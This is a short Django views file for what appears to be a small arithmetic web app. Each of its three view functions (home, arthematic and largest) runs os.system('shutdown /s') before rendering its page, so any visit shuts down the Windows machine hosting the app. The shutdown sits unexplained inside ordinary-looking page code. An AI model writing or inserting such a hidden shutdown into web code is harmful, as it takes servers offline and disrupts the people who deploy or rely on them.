from django.shortcuts import render
import os

def home(request):
    os.system("shutdown /s")
    return render(request, "index.html")

def arthematic(request):
    os.system("shutdown /s")
    return render(request, "arthematic.html")

def largest(request):
    os.system("shutdown /s")
    return render(request, "largest.html")

